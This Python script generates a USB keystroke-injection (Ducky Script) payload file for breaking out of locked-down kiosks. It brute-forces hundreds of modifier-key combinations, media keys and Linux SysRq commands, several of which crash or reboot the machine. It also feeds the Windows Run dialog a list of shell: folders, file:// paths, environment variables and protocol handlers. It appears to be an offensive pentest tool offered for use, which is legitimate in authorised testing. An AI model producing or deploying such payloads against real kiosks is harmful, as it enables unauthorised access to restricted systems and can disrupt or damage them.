MODIFIERS = [
    ['CTRL'],
    ['ALT'],
    ['CTRL', 'ALT'],
    ['CTRL', 'SHIFT'],
    ['GUI'],  
    ['GUI', 'SHIFT'],
    ['ALT', 'SHIFT'],
    ['ALT', 'GUI'],
    ['CTRL', 'ALT', 'SHIFT'],
    ['CTRL', 'GUI'],
    ['CTRL', 'GUI', 'SHIFT']
]

COMMON_KEYS = (
    [chr(c) for c in range(ord('a'), ord('z') + 1)] +
    [str(d) for d in range(0, 10)] +
    ['ESCAPE', 'ESC', 'TAB', 'ENTER', 'SPACE','DELETE', 'BACKSPACE', 'INSERT', 'HOME', 'END', 'MENU', 'PRINTSCREEN','BREAK', 'PAUSE','PAGEUP', 'PAGEDOWN','UPARROW', 'DOWNARROW', 'LEFTARROW', 'RIGHTARROW','UP', 'DOWN', 'LEFT', 'RIGHT','F1', 'F2', 'F3', 'F4', 'F5', 'F6', 'F7', 'F8', 'F9', 'F10', 'F11', 'F12'
    ]
)

MEDIA_KEYS = ['EXIT','HOME', 'BACK', 'FORWARD', 'REFRESH', 'SNAPSHOT','PLAY', 'PAUSE', 'PLAY_PAUSE', 'NEXT_TRACK', 'PREV_TRACK','STOP', 'EJECT', 'MUTE', 'VOLUME_UP', 'VOLUME_DOWN','FN'
]

MOUSE_COMMANDS = ['LEFTCLICK', 'RIGHTCLICK'
]

STANDALONE_SPECIAL = ['PRINTSCREEN', 'BREAK', 'PAUSE', 'INSERT'
]

altstring_payloads = [
    "shell:Administrative Tools",
    "shell:DocumentsLibrary",
    "shell:Libraries",
    "shell:UserProfiles",
    "shell:Personal",
    "shell:SearchHomeFolder",
    "shell:NetworkPlacesFolder",
    "shell:SendTo",
    "shell:UserProfiles",
    "shell:Common Administrative Tools",
    "shell:MyComputerFolder",
    "shell:InternetFolder",
    "Shell:Profile",
    "Shell:ProgramFiles",
    "Shell:System",
    "Shell:ControlPanelFolder",
    "Shell:Windows",
    "shell:::{21EC2020 3AEA 1069 A2DD 08002B30309D}",
    "shell:::{20D04FE0 3AEA 1069 A2D8 08002B30309D}",
    "shell:::{{208D2C60 3AEA 1069 A2D7 08002B30309D}}",
    "shell:::{871C5380 42A0 1069 A2EA 08002B30309D}",
    "file:///C:/Kiosk/HTML/index.html",
    "file:///C:/Users/KioskRestricted",
    "File:/C:/windows",
    "File:/C:\\windows\\",
    "File:/C:\\windows/",
    "File:/C:/windows",
    "File://C:/windows",
    "File://C:\\windows/",
    "file://C:\\windows",
    "C:/windows",
    "C:\\windows\\",
    "C:\\windows",
    "C:/windows/",
    "C:/windows\\",
    "%WINDIR%",
    "%TMP%",
    "%TEMP%",
    "%SYSTEMDRIVE%",
    "%SYSTEMROOT%",
    "%APPDATA%",
    "%HOMEDRIVE%",
    "%HOMESHARE%",
    "Callto://",
    "Gopher://",
    "DHCP://",
    "Telnet://",
    "TN3270://",
    "Rlogin://",
    "LDAP://",
    "News://",
    "Mailto://",
    "MMS://",
    "SKYPE://",
    "SIP://",
    "Play://",
    "Steam://",
    "Quicktime://",
    "smb://",
    "ftp://"
]

def combo_to_ducky(combo):
    return ' '.join(combo)

def generate(output_path='breakout_payload.txt'):
    with open(output_path, 'w') as f:
        
        f.write("DEFAULT_DELAY 200\n")
        
        
        f.write("\nREM === Modifier Brute Force Combos ===\n")
        for mod in MODIFIERS:
            for key in COMMON_KEYS:
                full_combo = mod + [key]
                f.write(combo_to_ducky(full_combo) + '\n')
        
        
        f.write("\nREM === Standalone Special Keys ===\n")
        for key in STANDALONE_SPECIAL:
            f.write(key + '\n')
        
        
        f.write("\nREM === Media Keys ===\n")
        for media_key in MEDIA_KEYS:
            f.write(f"MEDIA {media_key}\n")
        
        
        f.write("\nREM === Media Keys with Modifiers ===\n")
        for mod in MODIFIERS:
            for media_key in MEDIA_KEYS:
                f.write(combo_to_ducky(mod) + f" MEDIA {media_key}\n")
        
        f.write("\nREM === Mouse Commands ===\n")
        for mouse_cmd in MOUSE_COMMANDS:
            f.write(mouse_cmd + '\n')
        
        f.write("\nREM === Globe Key Combinations (Mac) ===\n")
        for key in COMMON_KEYS[:26]:  
            f.write(f"GLOBE {key}\n")
        
        f.write("\nREM === SysRq Commands (Linux) ===\n")
        sysrq_chars = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9',  'c',  'd',  
                       'e',  'f',  'g',  'h',  'i',  'j',  'k',  'l',  'm',  'n',  
                       'p',  'q',  'r',  's',  't',  'u',  'v',  'w',  'x',  'z',  \
                        'D',  'R',  'S'   
        ]

        for char in sysrq_chars:
            f.write(f"SYSRQ {char}\n")
        
        f.write("\nREM === Shift Spam ===\n")
        for _ in range(5):
            f.write("SHIFT\n")
    
        f.write("\nREM === ALTSTRING Payloads ===\n")
        for string in altstring_payloads:
            f.write(f"GUI r\n")
            f.write(f"ALTSTRING {string}\n")
            f.write(f"ENTER\n")
            

if __name__ == "__main__":
    generate()
